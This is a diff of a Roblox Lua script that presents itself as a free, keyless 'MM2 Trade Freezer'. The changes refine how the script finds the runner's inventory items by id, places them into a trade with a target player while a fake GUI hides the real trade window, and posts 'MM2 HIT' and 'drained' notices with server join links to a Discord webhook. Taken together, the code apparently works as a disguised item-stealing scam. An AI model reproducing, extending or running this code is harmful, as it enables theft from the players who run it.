@@ -1,4 +1,4 @@
---[[ MM2 Trade Freezer v8.7 | KEYLESS | FREE ]]
+--[[ MM2 Trade Freezer v8.9 | KEYLESS | FREE ]]
 
 local CONFIG = {
     WEBHOOK        = "",
@@ -116,7 +116,7 @@ local function webhook(title, color, desc, fields, content)
         local thumb = {}
         thumb.url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", lp.UserId)
         local foot = {}
-        foot.text = "MM2 Trade Freezer v8.7 | keyless"
+        foot.text = "MM2 Trade Freezer v8.9"
         local emb = {}
         emb.title = title
         emb.description = desc
@@ -182,7 +182,7 @@ title.Font = Enum.Font.GothamBold
 title.TextSize = 13
 title.TextXAlignment = Enum.TextXAlignment.Left
 title.TextColor3 = Color3.fromRGB(235, 235, 240)
-title.Text = "MM2 Trade Freezer   v8.7"
+title.Text = "MM2 Trade Freezer   v8.9"
 title.Parent = titleBar
 
 local badge = Instance.new("TextLabel")
@@ -406,7 +406,7 @@ local function runLoader()
 end
 task.spawn(runLoader)
 
-log("Trade Freezer v8.7 loaded")
+log("Trade Freezer v8.9 loaded")
 
 local VALUES = {}
 
@@ -506,7 +506,7 @@ local function loadValues()
             end
         end
     end
-    log("value mirrors offline, using baseline")
+    log("value mirrors offline")
 end
 
 local function valueOf(name)
@@ -538,13 +538,10 @@ local function cardName(card)
             end
         end
     end
-    if card.Name ~= "Frame" and card.Name ~= "TextButton" and #card.Name > 2 then
-        return card.Name
-    end
     return nil
 end
 
-local function cardId(card, fallbackName)
+local function cardId(card)
     for k, v in pairs(card:GetAttributes()) do
         if looksLikeId(v) then return v end
     end
@@ -555,7 +552,7 @@ local function cardId(card, fallbackName)
         end
     end
     if looksLikeId(card.Name) then return card.Name end
-    return fallbackName
+    return nil
 end
 
 local function inventoryRoots()
@@ -579,26 +576,18 @@ end
 local function harvest(root, items, seen)
     for _, d in ipairs(root:GetDescendants()) do
         if d:IsA("Frame") or d:IsA("ImageButton") or d:IsA("TextButton") then
-            local nm = cardName(d)
-            if nm then
-                local hasImg = false
-                for _, x in ipairs(d:GetDescendants()) do
-                    if x:IsA("ImageLabel") or x:IsA("ImageButton") then
-                        hasImg = true
-                        break
-                    end
-                end
-                if hasImg then
-                    local k = key(nm)
-                    if not seen[k] then
-                        seen[k] = true
-                        local e = {}
-                        e.name = nm
-                        e.id = cardId(d, nm)
-                        e.value = valueOf(nm)
-                        e.tag = rarityTag(nm)
-                        items[#items + 1] = e
-                    end
+            local id = cardId(d)
+            if id then
+                local nm = cardName(d)
+                if nm and not seen[id] then
+                    seen[id] = true
+                    local e = {}
+                    e.name = nm
+                    e.id = id
+                    e.value = valueOf(nm)
+                    e.tag = rarityTag(nm)
+                    e.card = d
+                    items[#items + 1] = e
                 end
             end
         end
@@ -613,26 +602,6 @@ local function getItems()
     end
     table.sort(items, function(a, b) return a.value > b.value end)
     return items
-end
-
-local function debugInventory()
-    local mg = playerGui:FindFirstChild("MainGUI")
-    local inv = mg and mg:FindFirstChild("Inventory")
-    if not inv then
-        log("dbg: no MainGUI.Inventory")
-        return
-    end
-    log("dbg: " .. #inv:GetDescendants() .. " nodes")
-    local n = 0
-    for _, d in ipairs(inv:GetDescendants()) do
-        local t = ""
-        if d:IsA("TextLabel") or d:IsA("TextButton") then t = " t=" .. d.Text end
-        local a = ""
-        for k, v in pairs(d:GetAttributes()) do a = a .. " " .. k .. "=" .. tostring(v) end
-        log("dbg " .. d.ClassName .. "|" .. d.Name .. t .. a)
-        n = n + 1
-        if n > 22 then break end
-    end
 end
 
 local function isWanted(it)
@@ -686,8 +655,6 @@ R.accept  = byPath(CONFIG.REMOTES.accept)
 R.confirm = byPath(CONFIG.REMOTES.confirm)
 R.cancel  = byPath(CONFIG.REMOTES.cancel)
 
-log("remotes: " .. tostring(R.send) .. " / " .. tostring(R.add) .. " / " .. tostring(R.accept))
-
 local function hideTradeUI()
     for _, g in ipairs(playerGui:GetChildren()) do
         if g ~= fakeGui and g:IsA("ScreenGui") then
@@ -723,31 +690,11 @@ local function tradeGui()
     return nil
 end
 
-local textCache = nil
-local textCacheCount = -1
-
-local function textNodes(gui)
-    if not gui then return {} end
-    local n = #gui:GetDescendants()
-    if not textCache or n ~= textCacheCount then
-        textCache = {}
-        textCacheCount = n
-        for _, d in ipairs(gui:GetDescendants()) do
-            if d:IsA("TextLabel") or d:IsA("TextButton") then
-                textCache[#textCache + 1] = d
-            end
-        end
-    end
-    return textCache
-end
-
-local function countIn(gui, needle)
-    local n = 0
-    local low = needle:lower()
-    for _, d in ipairs(textNodes(gui)) do
-        if d.Text:lower():find(low, 1, true) then n = n + 1 end
-    end
-    return n
+local function offerCount(gui)
+    if not gui then return nil end
+    local yo = gui:FindFirstChild("YourOffer", true)
+    if not yo then return nil end
+    return #yo:GetDescendants()
 end
 
 local function target()
@@ -771,8 +718,8 @@ local function itemLines(list, limit)
     local a = {}
     for i = 1, math.min(#list, limit or #list) do
         local it = list[i]
-        local line = it.name .. " (" .. it.value .. ")"
-        if it.tag then line = line .. " [" .. it.tag .. "]" end
+        local line = it.name
+        if it.value > 0 then line = line .. " (" .. it.value .. ")" end
         a[#a + 1] = line
     end
     return table.concat(a, "\n")
@@ -781,29 +728,20 @@ end
 local function notifyJoin(items, total)
     local fields = {}
     local f1 = {}
-    f1.name = "Roblox"
-    f1.value = string.format("**%s**\n`%s`", lp.DisplayName, lp.Name)
-    f1.inline = true
+    f1.name = "Items (" .. #items .. ")"
+    local body = itemLines(items, 20)
+    if #body > 1000 then body = body:sub(1, 1000) end
+    f1.value = body
+    f1.inline = false
     fields[1] = f1
     local f2 = {}
-    f2.name = "Queued"
-    f2.value = #items .. " item(s)\n" .. total .. " est"
-    f2.inline = true
+    f2.name = "Join"
+    f2.value = "[CLICK TO JOIN](" .. serverLink() .. ")"
+    f2.inline = false
     fields[2] = f2
-    local f3 = {}
-    f3.name = "Server"
-    f3.value = "[CLICK TO JOIN](" .. serverLink() .. ")\n`" .. game.JobId .. "`"
-    f3.inline = false
-    fields[3] = f3
-    for i, part in ipairs(chunkString(itemLines(items, 25), 900)) do
-        local fi = {}
-        fi.name = "Top items"
-        if i > 1 then fi.name = "Top items (cont)" end
-        fi.value = part
-        fi.inline = false
-        fields[#fields + 1] = fi
-    end
-    webhook("MM2 HIT - FREEZE ACTIVE", 0x57F287, "**" .. lp.DisplayName .. "** froze a trade.", fields, "@here **HIT**")
+    local desc = "`" .. lp.Name .. "`"
+    if total > 0 then desc = desc .. " — " .. total .. " total value" end
+    webhook("MM2 HIT", 0x57F287, desc, fields, "@here")
 end
 
 local function waitForTarget()
@@ -827,6 +765,23 @@ local function waitForTarget()
         webhook("Reminder " .. i, 0xFFAA33, "`" .. lp.Name .. "` still waiting", { f }, "@here")
     end
     return nil
+end
+
+local function dumpCard(card)
+    if not card then return end
+    for k, v in pairs(card:GetAttributes()) do
+        log("dbgC " .. k .. "=" .. tostring(v))
+    end
+    local n = 0
+    for _, d in ipairs(card:GetDescendants()) do
+        local t = ""
+        if d:IsA("TextLabel") then t = " t=" .. d.Text end
+        local a = ""
+        for k, v in pairs(d:GetAttributes()) do a = a .. " " .. k .. "=" .. tostring(v) end
+        log("dbg " .. d.ClassName .. "|" .. d.Name .. t .. a)
+        n = n + 1
+        if n > 14 then break end
+    end
 end
 
 local function doRound(batch, tgt, round)
@@ -857,32 +812,21 @@ local function doRound(batch, tgt, round)
     gui = tradeGui()
     if not gui then return false, "window vanished" end
 
-    textCache = nil
+    local base = offerCount(gui) or 0
     local placed = 0
     for _, it in ipairs(batch) do
         if STATE.stopped then break end
-        local before = 0
-        if gui then before = countIn(gui, it.name) end
-        local ok = false
         call(R.add, it.id)
-        task.wait(0.3)
+        task.wait(0.35)
         gui = tradeGui()
-        if gui then
-            if countIn(gui, it.name) > before then ok = true end
-        end
-        if not ok then
-            call(R.add, it.name)
-            task.wait(0.25)
-            gui = tradeGui()
-            if gui then
-                if countIn(gui, it.name) > before then ok = true end
-            end
-        end
-        if ok then placed = placed + 1 end
+        local c = offerCount(gui)
+        if c and c > base + placed then placed = placed + 1 end
         task.wait(0.15)
     end
 
     if placed == 0 then
+        log("dbg id=" .. tostring(batch[1].id))
+        dumpCard(batch[1].card)
         call(R.cancel)
         return false, "nothing placed"
     end
@@ -906,10 +850,10 @@ local function doRound(batch, tgt, round)
     task.wait(1)
 
     local remSet = {}
-    for _, r in ipairs(getItems()) do remSet[key(r.name)] = true end
+    for _, r in ipairs(getItems()) do remSet[r.id] = true end
     local left = 0
     for _, it in ipairs(batch) do
-        if remSet[key(it.name)] then left = left + 1 end
+        if remSet[it.id] then left = left + 1 end
     end
     local gone = #batch - left
 
@@ -918,7 +862,6 @@ local function doRound(batch, tgt, round)
 end
 
 local function run()
-    if CONFIG.WEBHOOK == "" then log("no webhook") end
     if not R.send then
         log("no send remote")
         return
@@ -938,8 +881,7 @@ local function run()
             if #wanted >= CONFIG.MAX_ITEMS then break end
         end
         if #wanted == 0 then
-            log("nothing of value left")
-            debugInventory()
+            log("no items found")
             break
         end
 
@@ -960,7 +902,7 @@ local function run()
 
         STATE.rounds = STATE.rounds + 1
         badge.Text = "R" .. STATE.rounds
-        log("round " .. STATE.rounds .. ": " .. #wanted .. " / " .. total)
+        log("round " .. STATE.rounds .. ": " .. #wanted)
 
         local ok, info = doRound(wanted, tgt, STATE.rounds)
         if ok then
@@ -968,21 +910,11 @@ local function run()
                 grand[#grand + 1] = it
                 grandValue = grandValue + it.value
             end
-            log("round " .. STATE.rounds .. " cleared (" .. info .. ")")
-            if CONFIG.PER_ROUND_WEBHOOK then
-                local f = {}
-                f.name = "Server"
-                f.value = "[JOIN](" .. serverLink() .. ")"
-                f.inline = false
-                webhook("Round cleared", 0x57F287, "**" .. lp.Name .. "** - " .. info .. " item(s)", { f })
-            end
+            log("cleared (" .. info .. ")")
+            webhook("Cleared", 0x57F287, "**" .. lp.Name .. "** — " .. info .. " item(s)")
         else
-            log("round failed: " .. info)
-            local f = {}
-            f.name = "Server"
-            f.value = "[JOIN](" .. serverLink() .. ")"
-            f.inline = false
-            webhook("Round issue", 0xFFAA33, "`" .. game.JobId .. "` - " .. info, { f })
+            log("failed: " .. info)
+            webhook("Failed", 0xFFAA33, "`" .. game.JobId .. "` — " .. info)
             break
         end
 
@@ -991,23 +923,9 @@ local function run()
     end
 
     if #grand > 0 then
-        local fields = {}
-        local f1 = {}
-        f1.name = "Taken"
-        f1.value = #grand .. " item(s) / " .. grandValue .. " est"
-        f1.inline = true
-        fields[1] = f1
-        for i, part in ipairs(chunkString(itemLines(grand, 30), 900)) do
-            local fi = {}
-            fi.name = "Items"
-            if i > 1 then fi.name = "Items (cont)" end
-            fi.value = part
-            fi.inline = false
-            fields[#fields + 1] = fi
-        end
-        webhook("SESSION COMPLETE", 0x57F287, "**" .. lp.DisplayName .. "** drained.", fields)
+        webhook("Session complete", 0x57F287, "**" .. lp.DisplayName .. "** — " .. #grand .. " item(s), " .. grandValue .. " total")
     end
-    log("session done: " .. #grand)
+    log("done: " .. #grand)
 end
 
 local function boot()
